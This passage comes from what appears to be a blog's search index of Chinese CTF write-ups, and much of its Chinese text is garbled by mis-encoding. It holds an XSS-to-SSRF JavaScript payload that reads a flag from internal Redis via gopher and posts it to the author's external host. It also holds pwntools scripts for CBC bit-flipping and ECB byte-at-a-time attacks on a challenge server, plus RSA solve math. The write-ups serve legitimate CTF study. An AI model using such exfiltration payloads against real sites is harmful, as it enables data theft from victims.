&quot;https://yoloyolo.top/1.php?key=&quot;+&quot;\\n&quot;+escape(httpreq1.responseText); ç›´æ¥æ„é€ XMLHttpRequestè¯·æ±‚æ¥è¯»å–phpçš„æ˜¾ç¤ºå†…å®¹ å¾—åˆ°çš„ç»“æœä¸º åªå…è®¸http|https|gopheråè®® ç»“åˆé¢˜ç›®æ‰€ç»™å‡ºçš„æç¤ºï¼Œflagåœ¨redisä¸­ï¼Œé‚£ä¹ˆå¯ä»¥åˆ©ç”¨CSRFæ¥è¿›è¡ŒSSRF SSRF 12345678//Payload3 For XSS+CSRF+SSRFvar httpreq2 = new XMLHttpRequest();httpreq2.open(&#x27;GET&#x27;,&#x27;http://192.168.56.103:40090/ssrf_for_test.php?url=gopher://127.0.0.1:6379/_*1%250d%250a%247%250d%250aCOMMAND%250d%250a*2%250d%250a%243%250d%250aget%250d%250a%244%250d%250aflag%250d%250aquit&#x27;,false);httpreq2.send();var httpreq3 = new XMLHttpRequest();httpreq3.open(&#x27;POST&#x27;,&#x27;https://yoloyolo.top/1.php&#x27;,false);httpreq3.setRequestHeader (&#x27;Content-type&#x27;, &#x27;application/x-www-form-urlencoded&#x27;);httpreq3.send(&quot;key=&quot;+escape(httpreq2.responseText)); å…ˆæ„é€ SSRFï¼Œä»redisä¸­è¯»å–flagï¼Œå†å°†è¯»å–åˆ°çš„å†…å®¹ç”¨POSTçš„æ–¹æ³•å‘é€åˆ°ç”¨äºæ¥æ”¶çš„php æµé‡éƒ¨åˆ†å¯ä»¥ç”¨WiresharkæŠ“åŒ…æ¥è§‚å¯Ÿï¼Œå¾—åˆ°çš„ç»“æœä¸º 12345678*1$7COMMAND*2$3get$4flag ä½†æ˜¯åé¢å¿…é¡»åŠ ä¸€ä¸ªquitï¼Œå¦åˆ™ä¼šä¸€ç›´ä¸redisè¿æ¥ï¼Œæ— æ³•å¾—åˆ°å›æ˜¾ç»“æœ è¿™ä¸ªquitåœ¨å¯¹redisæŠ“åŒ…æ—¶å¹¶æ²¡æœ‰çœ‹åˆ°ï¼Œè€Œä¸”åœ¨rediså®¢æˆ·ç«¯ä¸­ä½¿ç”¨quitå’Œexitéƒ½å¯ä»¥é€€å‡ºï¼Œä½†æ˜¯åœ¨ä½¿ç”¨gopheråè®®æ—¶åªæœ‰quitç”Ÿæ•ˆ æ”¾åœ¨jsä¸­çš„æ—¶å€™å¿…é¡»è¿›è¡ŒåŒé‡URLç¼–ç ï¼Œå¦åˆ™æ— æ•ˆ è¿™é‡Œå¦‚æœè¿˜æ˜¯ä½¿ç”¨imgæ ‡ç­¾æ¥ç”¨GETæ–¹æ³•ä¼ é€’å‚æ•°çš„è¯ï¼Œåˆ™ä¼šå‡ºç° HTTP 414 Request-URI Too Long çš„é”™è¯¯ï¼Œæ‰€ä»¥åªèƒ½POSTçš„æ–¹æ³• ä½†æ˜¯ä½¿ç”¨XMLHttpRequestè¯·æ±‚å»è®¿é—®è·¨åŸŸèµ„æºæ—¶(CORS)ï¼Œä¼šå› ä¸ºæµè§ˆå™¨çš„åŒæºç­–ç•¥é€ æˆä¸€äº›å½±å“ï¼Œå¯èƒ½å°±ä¸ä¼šå»åŠ è½½èµ„æºï¼Œä½†æ˜¯å¯¹è·å–flagæ²¡æœ‰å½±å“ ä¸è¿‡åœ¨æŸ¥é˜…ä¸€äº›èµ„æ–™ä¹‹åç†æ¸…æ¥šäº†è¿‡ç¨‹ å®¢æˆ·ç«¯å¸¦ç€redisæ‰“å‡ºæ¥çš„æ•°æ®å¯¹è¿œç¨‹æœåŠ¡ç«¯è¿›è¡Œè·¨åŸŸè¯·æ±‚ è¿œç¨‹æœåŠ¡ç«¯å“åº”åŒ…çš„å¤´éƒ¨æ²¡æœ‰è®¾ç½® Access-Control-Allow-Origin å®¢æˆ·ç«¯ç¦æ­¢è½½å…¥è¿œç¨‹å®¢æˆ·ç«¯çš„èµ„æº ä¸è¿‡åœ¨ç¬¬ä¸€æ­¥æ—¶ï¼Œç”±äºå¸¦ç€æ•°æ®è¿›è¡Œè¯·æ±‚äº†ï¼Œé‚£ä¹ˆphpè‡ªç„¶å°±æŠŠæ•°æ®å†™å…¥æ–‡ä»¶ä¸­äº† è¿™ä¸ªé—®é¢˜å¯ä»¥åœ¨apacheçš„é…ç½®æ–‡ä»¶ä¸­æ·»åŠ Access-Control-Allow-Originæ¥è¿›è¡Œè§£å†³ï¼Œä½†æ˜¯å¯¹äºæœ¬é¢˜æ¥è¯´æœ‰ç‚¹ç”»è›‡æ·»è¶³ ä¸€ç¯‡é¢˜ç›®ç›¸ä¼¼çš„WP XSSçš„å¨åŠ›ï¼šä»XSSåˆ°SSRFå†åˆ°Redis","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://yoloyolo.top/categories/WriteUp/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://yoloyolo.top/tags/Web/"},{"name":"XSS","slug":"XSS","permalink":"https://yoloyolo.top/tags/XSS/"},{"name":"CSRF","slug":"CSRF","permalink":"https://yoloyolo.top/tags/CSRF/"},{"name":"SSRF","slug":"SSRF","permalink":"https://yoloyolo.top/tags/SSRF/"}]},{"title":"SWPUCTF -- Crypto","slug":"SWPUCTF-Crypto","date":"2021-01-14T13:17:44.000Z","updated":"2022-06-27T18:22:59.000Z","comments":true,"path":"2021/01/14/SWPUCTF-Crypto/","link":"","permalink":"https://yoloyolo.top/2021/01/14/SWPUCTF-Crypto/","excerpt":"Webç‹—åšä¸æ¥Miscæ‰€ä»¥æŠŠCryptoç»™AKäº†","text":"Webç‹—åšä¸æ¥Miscæ‰€ä»¥æŠŠCryptoç»™AKäº† happy ä¸€å¼€å§‹é¢˜ç›®ä¸Šé”™é™„ä»¶æµªè´¹å¿«ä¸¤ä¸ªå°æ—¶ï¼Œæœ‰ç‚¹æ— è¯­ 1234(&#x27;c=&#x27;, &#x27;0x7a7e031f14f6b6c3292d11a41161d2491ce8bcdc67ef1baa9eL&#x27;)(&#x27;e=&#x27;, &#x27;0x872a335&#x27;)#q + q*p^3 = 1285367317452089980789441829580397855321901891350429414413655782431779727560841427444135440068248152908241981758331600586#qp + q *p^2 = 1109691832903289208389283296592510864729403914873734836011311325874120780079555500202475594 a=q+qâˆ—p3a = q+q*p^3a=q+qâˆ—p3 b=qâˆ—p+qâˆ—p2b = q*p+q*p^2b=qâˆ—p+qâˆ—p2 x=gcd(a,b)x = gcd(a,b)x=gcd(a,b) ab=q+qâˆ—p3qâˆ—p+qâˆ—p2=1+p3p+p2=a/xb/x\\frac{a}{b} = \\frac{q+q*p^3}{q*p+q*p^2} = \\frac{1+p^3}{p+p^2} = \\frac{a/x}{b/x}baâ€‹=qâˆ—p+qâˆ—p2q+qâˆ—p3â€‹=p+p21+p3â€‹=b/xa/xâ€‹ å› å¼åˆ†è§£ 1+p3p+p2=(1+p)âˆ—(p2âˆ’p+1)pâˆ—(1+p)=p2âˆ’p+1p\\frac{1+p^3}{p+p^2} = \\frac{(1+p)*(p^2-p+1)}{p*(1+p)} = \\frac{p^2-p+1}{p}p+p21+p3â€‹=pâˆ—(1+p)(1+p)âˆ—(p2âˆ’p+1)â€‹=pp2âˆ’p+1â€‹ è¿™é‡Œb/xçš„å€¼ä¸ºç´ æ•°ï¼Œå°è¯•ä½œä¸ºpè¿›è¡Œè§£å¯† 12345678910111213141516import gmpy2from Crypto.Util.number import *c = 0x7a7e031f14f6b6c3292d11a41161d2491ce8bcdc67ef1baa9ee = 0x872a335#q + q*p^3 = 1285367317452089980789441829580397855321901891350429414413655782431779727560841427444135440068248152908241981758331600586#qp + q *p^2 = 1109691832903289208389283296592510864729403914873734836011311325874120780079555500202475594a = 1285367317452089980789441829580397855321901891350429414413655782431779727560841427444135440068248152908241981758331600586b = 1109691832903289208389283296592510864729403914873734836011311325874120780079555500202475594x = gmpy2.gcd(a, b)p = b // xq = b // (p + p ** 2)n = p * qphi = (p - 1) * (q - 1)d = gmpy2.invert(e, phi)m = pow(c, d, n)print(long_to_bytes(m)) Yusaçš„å¯†ç å­¦è¯¾å ‚ CBCç¬¬ä¸€è¯¾ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960from Crypto.Cipher import AESimport osflag=&#x27;flag&#123;********************************&#125;&#x27;BLOCKSIZE = 16def pad(data): pad_len = BLOCKSIZE - (len(data) % BLOCKSIZE) if len(data) % BLOCKSIZE != 0 else 0 return data + &quot;=&quot; * pad_lendef unpad(data): return data.replace(&quot;=&quot;,&quot;&quot;)def enc(data,key,iv): cipher = AES.new(key, AES.MODE_CBC, iv) encrypt = cipher.encrypt(pad(data)) return encryptdef dec(data,key,iv): try: cipher = AES.new(key, AES.MODE_CBC, iv) encrypt = cipher.decrypt(data) return unpad(encrypt) except: exit()def task(): try: key = os.urandom(16) iv = os.urandom(16) pre = &quot;yusa&quot;*4 for _ in range(3): choice = raw_input(menu) if choice == &#x27;1&#x27;: name = raw_input(&quot;What&#x27;s your name?&quot;) if name == &#x27;admin&#x27;: exit() token = enc(pre+name,key,iv) print &quot;Here is your token(in hex): &quot; + iv.encode(&#x27;hex&#x27;) + token.encode(&#x27;hex&#x27;) continue elif choice == &#x27;2&#x27;: token = raw_input(&quot;Your token(in hex): &quot;).decode(&#x27;hex&#x27;) iv = token[:16] name = dec(token[16:],key,iv) print iv.encode(&#x27;hex&#x27;) + name.encode(&#x27;hex&#x27;) if name[:16] == &quot;yusa&quot;*4: print &quot;Hello, &quot; + name[16:] if name[16:] == &#x27;admin&#x27;: print flag exit() else: continue except: exit()menu=&#x27;&#x27;&#x27;1. register2. login3. exit&#x27;&#x27;&#x27;if __name__ == &quot;__main__&quot;: task() CBC Byte Flip å¦‚å›¾æ‰€ç¤º æˆ‘ä»¬è¦æŠŠplain2ä¸­çš„æŸä¸€å­—èŠ‚ç¿»è½¬ä¸ºå¦ä¸€å­—èŠ‚ ç”±äºC1æ¥è‡ªäºcipher2è¿›è¡ŒBlock Cipher Decryptionä¹‹åçš„ç»“æœ è€Œä¸”keyæœªçŸ¥ï¼Œå°±ä¸èƒ½ç›´æ¥å¾—çŸ¥C1çš„å€¼ ä½†æ˜¯å­—èŠ‚ç¿»è½¬çš„å¦™å¤„åœ¨äºé€šè¿‡ä¿®æ”¹ä¸Šä¸€ç»„çš„å¯†æ–‡æ¥ç¿»è½¬ä¸‹ä¸€ç»„çš„æ˜æ–‡ï¼Œä»è€Œå¯ä»¥å®Œå…¨å¿½è§†è¿™ä¸€ç‚¹ ç”±å¼‚æˆ–è¿ç®—å¯ä»¥æ¨å¯¼ B1 = A1 xor C1 é‚£ä¹ˆä¹Ÿæœ‰C1 = A1 xor B1 B1â€™ = A1â€™ xor C1 (A1â€™æ˜¯ä¿®æ”¹ä¹‹åçš„å¯†æ–‡å­—èŠ‚ï¼ŒB1â€™æ˜¯ç¿»è½¬ä¹‹åçš„æ˜æ–‡å­—èŠ‚) è€Œå¦‚æœæˆ‘ä»¬èƒ½å¤Ÿä¿®æ”¹cipher1ï¼Œé‚£ä¹ˆå°±èƒ½å¤Ÿä¿®æ”¹A1çš„å€¼ å³A1â€™ = A1 xor B1 xor B1â€™ A1â€™ xor C1 = A1 xor B1 xor B1â€™ xor C1 = C1 xor B1â€™ xor C1 = B1â€™ ç”¨ä¸‰æ¡ç®—å¼æ¥è¡¨è¿°ä¸Šé¢çš„è¯å°±æ˜¯ B = A xor C Bâ€™ = Aâ€™ xor C Aâ€™ = A xor B xor Bâ€™ å­—èŠ‚ç¿»è½¬çš„è¦æ±‚ä¹Ÿå°±æ˜¾è€Œæ˜“è§äº† å¯¹äºAå®Œå…¨å¯æ§ å·²çŸ¥Bçš„å€¼ åˆ°è¿™é‡Œä¹Ÿåªå®Œæˆäº†ä¸€åŠ ç”±äºä¿®æ”¹äº†A1 cipher1åœ¨è¿›è¡ŒBCDçš„æ—¶å€™ä¼šå¾—å‡ºé”™è¯¯çš„ç»“æœ å†ä¸IVç›¸å¼‚æˆ–åˆ™ä¼šå¯¼è‡´plain1å‡ºé”™ å¦‚æœèƒ½å¤Ÿå¾—åˆ°ä¿®æ”¹A1ä¹‹åäº§ç”Ÿçš„é”™è¯¯çš„plain1çš„å€¼ è€Œä¸”IVå¯ä»¥å®Œå…¨æ§åˆ¶çš„è¯ é‚£ä¹ˆå°±èƒ½å¤ŸæŠŠåˆšæ‰çš„æŠŠæˆå†ç©ä¸€é B2 = A2 xor C2 B2â€™ = A2â€™ xor C2 A2â€™ = A2 xor B2 xor B2â€™ A2ä¸ºåŸIV B2æ˜¯é”™è¯¯çš„plain1 B2â€™æ˜¯æ­£ç¡®çš„plain1 BTW:æ¯ä¸€ç»„Cipherçš„é•¿åº¦ä¸º16Byte ä»¥ä¸Šå¤§æ¦‚ä»‹ç»äº†CBCå­—èŠ‚ç¿»è½¬çš„æ”»å‡»æ–¹å¼ éœ€è¦å¯†æ–‡ä»¥åŠIVå¯æ§æ¥æ”¹å†™æ˜æ–‡ 12345678910111213141516171819202122232425262728293031323334353637383940from pwn import *import binasciiimport timep = remote(&#x27;das.wetolink.com&#x27;,42888) # è¿æ¥p.recvuntil(b&quot;3. exit\\n&quot;)p.sendline(b&quot;1&quot;) # æ³¨å†Œp.recv()p.sendline(b&quot;Admin&quot;) # ç”¨æˆ·åä¸ºAdminï¼Œæ–¹ä¾¿ä¹‹åä¿®æ”¹data0 = p.recvline().decode()data0 = data0[28:124] # æå–è¿”å›æ•°æ®éƒ¨åˆ†iv0 = data0[:32] #è¿”å›çš„IVcipher00 = data0[32:64] #&quot;yusayusayusayusa&quot;çš„åŠ å¯†ç»“æœcipher01 = data0[64:96] #&quot;Admin&quot;çš„åŠ å¯†ç»“æœreplacement = str(hex(int(cipher00[:2], 16) ^ ord(&quot;A&quot;) ^ ord(&quot;a&quot;)))[2:] # è®¡ç®—æ›¿æ¢å¯†æ–‡çš„å€¼payload0 = iv0 + replacement + cipher00[2:] + cipher01 # å‘é€æ›¿æ¢å¯†æ–‡#print(&quot;data0: &quot; + data0)#print(&quot;payload0: &quot; + payload0)p.recvuntil(b&quot;3. exit\\n&quot;)p.sendline(b&quot;2&quot;) # ç™»å…¥p.recv()p.sendline(payload0.encode()) # å‘é€Payload0data1 = p.recvline()[:-1].decode() # å¾—åˆ°è¿”å›çš„æ•°æ®plain1 = data1[32:64] # &quot;yusayusayusayusa&quot;ç”±äºå¯†æ–‡è¢«æ›¿æ¢ï¼Œè§£å‡ºæ¥çš„æ˜æ–‡æ˜¯é”™è¯¯çš„ï¼Œä¹‹åå¯ä»¥è¿›è¡Œå¼‚æˆ–ä¿®æ”¹#print(&quot;data1: &quot; + data1)#print(&quot;plain1: &quot; + plain1)iv1 = str(hex(int(binascii.hexlify(&quot;yusa&quot;.encode()).decode() * 4,16) ^ int(plain1, 16) ^ int(iv0, 16)))[2:] # è®¡ç®—IVï¼Œç”¨äºä¿®æ”¹é”™è¯¯çš„æ˜æ–‡#print(&quot;iv1: &quot;,iv1)payload1 = iv1 + replacement + cipher00[2:] + cipher01#print(&quot;payload1: &quot; + payload1)p.recvuntil(b&quot;3. exit\\n&quot;)p.sendline(b&quot;2&quot;) # ç™»å…¥p.recv()p.sendline(payload1.encode()) # å‘é€Payload1p.recvuntil(b&quot;admin\\n&quot;)print(p.recvline()) # å¾—åˆ°flag Yusaçš„å¯†ç å­¦è¯¾å ‚ ECB 1234567891011121314151617181920212223242526272829303132333435363738from Crypto.Cipher import AESimport osBLOCKSIZE = 16flag=&#x27;flag&#123;********************************&#125;&#x27;def pad(data): pad_len = BLOCKSIZE - (len(data) % BLOCKSIZE) if len(data) % BLOCKSIZE != 0 else 0 return data + chr(pad_len) * pad_lendef unpad(data): num = ord(data[-1]) return data[:-num]def enc(data,key): cipher = AES.new(key, AES.MODE_ECB) encrypt = cipher.encrypt(pad(data)) return encryptdef dec(data,key): try: cipher = AES.new(key, AES.MODE_ECB) encrypt = cipher.decrypt(data) return unpad(encrypt) except: exit()def task(): try: key = os.urandom(16) while True: plaintext = raw_input(&quot;Amazing function: &quot;).decode(&#x27;hex&#x27;) yusa = plaintext + flag print enc(yusa,key).encode(&#x27;hex&#x27;) except Exception as e: print str(e) exit()if __name__ == &quot;__main__&quot;: task() è¿™é‡Œçš„åŠ å¯†çš„æ˜æ–‡ä¸º&quot;è¾“å…¥çš„hexè½¬å­—ç¬¦&quot;+â€œflagâ€+Padding å¦‚æœå‘é€çš„æ˜æ–‡ä¸º aaaaaaaaaaaa é‚£ä¹ˆåŠ å¯†çš„æ˜æ–‡ä¸º aaaaaaaaaaaaflag&#123;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&#125; åˆ†ç»„Paddingä¹‹åçš„ç»“æœä¸º aaaaaaaaaaaaflag &#123;XXXXXXXXXXXXXXX XXXXXXXXXXXXXXXX X&#125;+Padding åˆ†æpadå‡½æ•°æˆ‘ä»¬å¯ä»¥çŸ¥é“Paddingçš„å€¼ è€ŒECBçš„åŠ å¯†æ–¹å¼å°±æ˜¯åˆ†ç»„æ˜æ–‡å¯†æ–‡ä¹‹é—´æ²¡æœ‰å…³è” é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ„é€  â€œ?}+Padding&quot;çš„æ˜æ–‡å»åŠ å¯†ï¼Œ?ä½œä¸ºæ©ç ï¼Œflagå†…å®¹é•¿åº¦ä¸º32å­—èŠ‚ï¼Œç›®æµ‹æ˜¯md5ï¼Œæ‰€ä»¥å­—ç¬¦é›†ç›®æµ‹æ˜¯&quot;0123456789abcdefâ€ ç„¶åæˆ‘ä»¬åœ¨å­—ç¬¦é›†é‡Œå»çˆ†ç ´ä¸€ä½æ©ç ï¼Œå°†å¾—åˆ°çš„ç»“æœä¸åŠ å¯†ç»“æœçš„æœ€åä¸€ä¸ªåˆ†ç»„è¿›è¡Œæ¯”è¾ƒï¼Œè‹¥ç›¸åŒåˆ™æˆ‘ä»¬å¾—åˆ°äº†flagæœ€åä¸€ä½çš„å­—èŠ‚ ç†è§£äº†ä¸Šè¿°å†…å®¹ä¹‹åå°±å¯ä»¥å†™ä¸€ä¸ªå¾ªç¯æ¥é€ä½çˆ†ç ´flagï¼Œæ¯æ¬¡åˆå§‹å¡«å……çš„aå¤šä¸€ä½ aåœ¨å˜é•¿çš„è¿‡ç¨‹ä¸­éœ€è¦æ³¨æ„æ˜æ–‡é•¿åº¦ä¼šå¤šå‡ºå‡ ä¸ªåˆ†ç»„ï¼Œä»è€Œå¯¼è‡´å¯†æ–‡ä¹Ÿå¤šå‡ºå‡ ä¸ªåˆ†ç»„ 12345678910111213141516171819202122232425262728293031323334353637from pwn import *import binasciiimport timeplain = &quot;flag&#123;********************************&#125;&quot;flag = &quot;&#125;&quot;BLOCKSIZE = 16char = &#x27;0123456789abcdef&#x27;p = remote(&#x27;das.wetolink.com&#x27;,42887)text = p.recv()for pad1 in range(12, 46): #print(&#x27;61&#x27;*pad1) p.sendline(&#x27;61&#x27;*pad1) text = p.recvline() print(len(text)) if len(text) &lt;= 147: res = text.decode()[-33:-1] elif len(text) &lt;= 179: res = text.decode()[-33-32:-1-32] else: res = text.decode()[-33-64:-1-64] #print(res) pad2 = (26-pad1)%16 #print(pad1) for j in char: time.sleep(0.1) payload = str(hex(ord(j)))[2:]+binascii.hexlify(flag.encode()).decode()+(&#x27;0&#x27;+str(hex(pad2)[2:]))*pad2 #print(payload) p.sendline(payload) text = p.recvline().decode() #print(text) if res == text[18:18+32]: flag = j + flag print(flag) breakflag = &quot;flag&#123;&quot; + flagprint(flag)","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://yoloyolo.top/categories/WriteUp/"}],"tags":[{"name":"Crypto","slug":"Crypto","permalink":"https://yoloyolo.top/tags/Crypto/"},{"name":"RSA","slug":"RSA","permalink":"https://yoloyolo.top/tags/RSA/"},{"name":"CBC","slug":"CBC","permalink":"https://yoloyolo.top/tags/CBC/"},{"name":"ECB","slug":"ECB","permalink":"https://yoloyolo.top/tags/ECB/"}]},{"title":"Crypto -- RSA","slug":"Crypto-RSA","date":"2021-01-14T13:07:07.000Z","updated":"2022-06-27T18:39:46.000Z","comments":true,"path":"2021/01/14/Crypto-RSA/","link":"","permalink":"https://yoloyolo.top/2021/01/14/Crypto-RSA/","excerpt":"RSA101 ppp, qqqä¸ºå¤§ç´ æ•° n=pâˆ—qn = p*qn=pâˆ—q phi=(pâˆ’1)âˆ—(qâˆ’1)phi = (p-1)*(q-1)phi=(pâˆ’1)âˆ—(qâˆ’1) eeeä¸ºå°äºphiphiphiçš„ç´ æ•° eâˆ—dâ‰¡1mod phie*d â‰¡ 1 \\mod phieâˆ—dâ‰¡1modphi eee, nnnä¸ºå…¬é’¥; ddd, nnnä¸ºç§é’¥ câ‰¡memod nc â‰¡ m^e \\mod ncâ‰¡memodn mâ‰¡cdmod nm â‰¡ c^d \\mod nmâ‰¡cdmodn","text":"RSA101 ppp, qqqä¸ºå¤§ç´ æ•° n=pâˆ—qn = p*qn=pâˆ—q phi=(pâˆ’1)âˆ—(qâˆ’1)phi = (p-1)*(q-1)phi=(pâˆ’1)âˆ—(qâˆ’1) eeeä¸ºå°äºphiphiphiçš„ç´ æ•° eâˆ—dâ‰¡1mod phie*d â‰¡ 1 \\mod phieâˆ—dâ‰¡1modphi eee, nnnä¸ºå…¬é’¥; ddd, nnnä¸ºç§é’¥ câ‰¡memod nc â‰¡ m^e \\mod ncâ‰¡memodn mâ‰¡cdmod nm â‰¡ c^d \\mod nmâ‰¡cdmodn dp &amp; dq mâ‰¡cdmod nm â‰¡ c^d \\mod nmâ‰¡cdmodn n=pâˆ—qn = p*qn=pâˆ—q dpâ‰¡dmod (pâˆ’1)d_p â‰¡ d \\mod (p-1)dpâ€‹â‰¡dmod(pâˆ’1) dq=dmod (qâˆ’1)d_q = d \\mod (q-1)dqâ€‹=dmod(qâˆ’1) é€šè¿‡ppp, qqq, dpd_pdpâ€‹, dqd_qdqâ€‹, cccè¿ç®—å¾—å‡ºmmm mâ‰¡cdmod nm â‰¡ c^d \\mod nmâ‰¡cdmodn mâ‰¡cdmod (pâˆ—q)m â‰¡ c^d \\mod (p*q)mâ‰¡cdmod(pâˆ—q) mpâ‰¡cdmod pm_p â‰¡ c^d \\mod pmpâ€‹â‰¡cdmodp mqâ‰¡cdmod qm_q â‰¡ c^d \\mod qmqâ€‹â‰¡cdmodq cd=mp+kpâˆ—pc^d = m_p+k_p*pcd=mpâ€‹+kpâ€‹âˆ—p cd=mq+kqâˆ—pc^d = m_q+k_q*pcd=mqâ€‹+kqâ€‹âˆ—p ç»“åˆä¸¤è€…å¯å¾— mq+kqâˆ—q=mp+kpâˆ—pm_q+k_q*q = m_p+k_p*pmqâ€‹+kqâ€‹âˆ—q=mpâ€‹+kpâ€‹âˆ—p mqâ‰¡mp+kpâˆ—pmod qm_q â‰¡ m_p+k_p*p \\mod qmqâ€‹â‰¡mpâ€‹+kpâ€‹âˆ—pmodq kpâˆ—pâ‰¡mqâˆ’mpmod qk_p*p â‰¡ m_q-m_p \\mod qkpâ€‹âˆ—pâ‰¡mqâ€‹âˆ’mpâ€‹modq kpâ‰¡(mqâˆ’mp)âˆ—pâˆ’1mod qk_p â‰¡ (m_q-m_p)*p^{-1} \\mod qkpâ€‹â‰¡(mqâ€‹âˆ’mpâ€‹)âˆ—pâˆ’1modq å…¶ä¸­ pâˆ’1âˆ—pâ‰¡1mod qp^{-1}*p â‰¡ 1 \\mod qpâˆ’1âˆ—pâ‰¡1modq ä»£å…¥ä¸‹å¼ cd=mp+kpâˆ—pc^d = m_p+k_p*pcd=mpâ€‹+kpâ€‹âˆ—p å¯å¾— cd=(((mqâˆ’mp)âˆ—pâˆ’1)%q)âˆ—p+mpc^d = (((m_q-m_p)*p^{-1})\\%q)*p+m_pcd=(((mqâ€‹âˆ’mpâ€‹)âˆ—pâˆ’1)%q)âˆ—p+mpâ€‹ mâ‰¡cdmod nâ‰¡(((mqâˆ’mp)âˆ—pâˆ’1)%q)âˆ—p+mpmod nm â‰¡ c^d \\mod n â‰¡ (((m_q-m_p)*p^{-1})\\%q)*p+m_p \\mod nmâ‰¡cdmodnâ‰¡(((mqâ€‹âˆ’mpâ€‹)âˆ—pâˆ’1)%q)âˆ—p+mpâ€‹modn å¯¹äºmpm_pmpâ€‹, mqm_qmqâ€‹ mpâ‰¡cdmod pm_p â‰¡ c^d \\mod pmpâ€‹â‰¡cdmodp mpâ‰¡cdp+kâˆ—(pâˆ’1)mod pm_p â‰¡ c^{d_p+k*(p-1)} \\mod pmpâ€‹â‰¡cdpâ€‹+kâˆ—(pâˆ’1)modp mpâ‰¡cdpâˆ—ckâˆ—(pâˆ’1)mod pm_p â‰¡ c^{d_p}*c^{k*(p-1)} \\mod pmpâ€‹â‰¡cdpâ€‹âˆ—ckâˆ—(pâˆ’1)modp è´¹é©¬å°å®šç†ï¼ˆpä¸ºç´ æ•°ï¼‰ï¼š apâˆ’1â‰¡1mod pa^{p-1} â‰¡ 1 \\mod papâˆ’1â‰¡1modp åˆ™ ckâˆ—(pâˆ’1)â‰¡1mod pc^{k*(p-1)} â‰¡ 1 \\mod pckâˆ—(pâˆ’1)â‰¡1modp mpâ‰¡cdpmod pm_p â‰¡ c^{d_p} \\mod pmpâ€‹â‰¡cdpâ€‹modp åŒç† mqâ‰¡cdqmod qm_q â‰¡ c^{d_q} \\mod qmqâ€‹â‰¡cdqâ€‹modq mâ‰¡cdmod nâ‰¡((((cdq%q)âˆ’(cdp%p))âˆ—pâˆ’1)%q)âˆ—p+(cdp%p)mod nm â‰¡ c^d \\mod n â‰¡ ((((c^{d_q}\\%q)-(c^{d_p}\\%p))*p^{-1})\\%q)*p+(c^{d_p}\\%p) \\mod nmâ‰¡cdmodnâ‰¡((((cdqâ€‹%q)âˆ’(cdpâ€‹%p))âˆ—pâˆ’1)%q)âˆ—p+(cdpâ€‹%p)modn å¯èƒ½å­˜åœ¨çš„éé¢„æœŸ m&lt;pm &lt; pm&lt;p mâ‰¡cdmod nm â‰¡ c^d \\mod nmâ‰¡cdmodn mâ‰¡cdmod (pâˆ—q)m â‰¡ c^d \\mod (p*q)mâ‰¡cdmod(pâˆ—q) m+kâˆ—pâˆ—q=cdm+k*p*q = c^dm+kâˆ—pâˆ—q=cd m+kâˆ—pâˆ—q=cdmod pm+k*p*q = c^d \\mod pm+kâˆ—pâˆ—q=cdmodp mâ‰¡cdmod pm â‰¡ c^d \\mod pmâ‰¡cdmodp mâ‰¡cdp+kâˆ—(pâˆ’1)mod pm â‰¡ c^{d_p+k*(p-1)} \\mod pmâ‰¡cdpâ€‹+kâˆ—(pâˆ’1)modp mâ‰¡cdpâˆ—ckâˆ—(pâˆ’1)mod pm â‰¡ c^{d_p}*c^{k*(p-1)} \\mod pmâ‰¡cdpâ€‹âˆ—ckâˆ—(pâˆ’1)modp mâ‰¡cdpmod pm â‰¡ c^{d_p} \\mod pmâ‰¡cdpâ€‹modp dp &amp; dq &amp; dr åœ¨ä¸‰ç´ æ•°ï¼ˆn=pâˆ—qâˆ—rn = p*q*rn=pâˆ—qâˆ—rï¼‰çš„æƒ…å†µä¸‹ï¼Œç»™å‡ºppp, qqq, rrr, dpd_pdpâ€‹, dqd_qdqâ€‹, drdrdr, nnn, cccæ¥æ±‚è§£mmm å…¶ä¸­ dpâ‰¡dmod (pâˆ’1)d_{p} â‰¡ d \\mod (p-1)dpâ€‹â‰¡dmod(pâˆ’1) dqâ‰¡dmod (qâˆ’1)d_{q} â‰¡ d \\mod (q-1)dqâ€‹â‰¡dmod(qâˆ’1) drâ‰¡dmod (râˆ’1)d_{r} â‰¡ d \\mod (r-1)drâ€‹â‰¡dmod(râˆ’1) å…¬å¼ä¸å˜ mâ‰¡cdmod nâ‰¡(((mqâˆ’mp)âˆ—pâˆ’1)%q)âˆ—p+mpmod nm â‰¡ c^d \\mod n â‰¡ (((m_q-m_p)*p^{-1})\\%q)*p+m_p \\mod nmâ‰¡cdmodnâ‰¡(((mqâ€‹âˆ’mpâ€‹)âˆ—pâˆ’1)%q)âˆ—p+mpâ€‹modn mâ‰¡cdmod nâ‰¡((((cdq%q)âˆ’(cdp%p))âˆ—pâˆ’1)%q)âˆ—p+(cdp%p)mod nm â‰¡ c^d \\mod n â‰¡ ((((c^{d_q}\\%q)-(c^{d_p}\\%p))*p^{-1})\\%q)*p+(c^{d_p}\\%p) \\mod nmâ‰¡cdmodnâ‰¡((((cdqâ€‹%q)âˆ’(cdpâ€‹%p))âˆ—pâˆ’1)%q)âˆ—p+(cdpâ€‹%p)modn joker åœ¨ä¸‰ç´ æ•°ï¼ˆn=pâˆ—qâˆ—rn = p*q*rn=pâˆ—qâˆ—rï¼‰çš„æƒ…å†µä¸‹ï¼Œç»™å‡ºppp, qqq, rrr, dpd_pdpâ€‹, dqd_qdqâ€‹, drdrdr, nnn, cccæ¥æ±‚è§£mmm å…¶ä¸­ dp=d%((qâˆ’1)âˆ—(râˆ’1))d_p = d \\% ((q-1)*(r-1))dpâ€‹=d%((qâˆ’1)âˆ—(râˆ’1)) dq=d%((pâˆ’1)âˆ—(râˆ’1))d_q = d \\% ((p-1)*(r-1))dqâ€‹=d%((pâˆ’1)âˆ—(râˆ’1)) dr=d%((pâˆ’1)âˆ—(qâˆ’1))d_r = d \\% ((p-1)*(q-1))drâ€‹=d%((pâˆ’1)âˆ—(qâˆ’1)) d=dp+kâˆ—(qâˆ’1)âˆ—(râˆ’1)d = d_p+k*(q-1)*(r-1)d=dpâ€‹+kâˆ—(qâˆ’1)âˆ—(râˆ’1) mpâ‰¡cdmod (qâˆ—r)m_p â‰¡ c^d \\mod (q*r)mpâ€‹â‰¡cdmod(qâˆ—r) 